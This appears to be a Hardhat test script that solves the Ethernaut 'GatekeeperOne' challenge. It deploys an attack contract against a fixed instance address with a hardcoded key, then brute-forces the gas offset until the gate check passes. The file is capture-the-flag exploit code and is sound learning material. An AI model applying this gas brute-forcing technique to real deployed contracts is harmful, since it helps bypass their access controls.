const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { ethers } = require("hardhat");

describe("GatekeeperOne", function () {
  async function deployGateKeeperOneAndAttacker() {
    const KEY_FOR_ACCOUNT1 = "0x0000010000002266"
    const instanceAddress = "0xA48180A95Fc5cB12D5E3299B61CE789a229a1348";
    const [account1] = await ethers.getSigners();
    
    const GatekeeperOneAttack = await ethers.getContractFactory("GatekeeperOneAttack");
    const attacker = await GatekeeperOneAttack.deploy(instanceAddress);

    return { attacker, account1, KEY_FOR_ACCOUNT1 };
  }

  describe("Attack", function () {
    it("Should find the gas amount and attack", async function () {
      const { attacker, account1, KEY_FOR_ACCOUNT1 } = await loadFixture(deployGateKeeperOneAndAttacker);

      for (let i = 0; i < 8191; i++){
        console.log("testing number: ", i);
        try {
          const tx = await attacker.connect(account1).attack(KEY_FOR_ACCOUNT1, i);
          console.log("gas =", i);
          return;
        } catch {}
      }
    });
  });
});
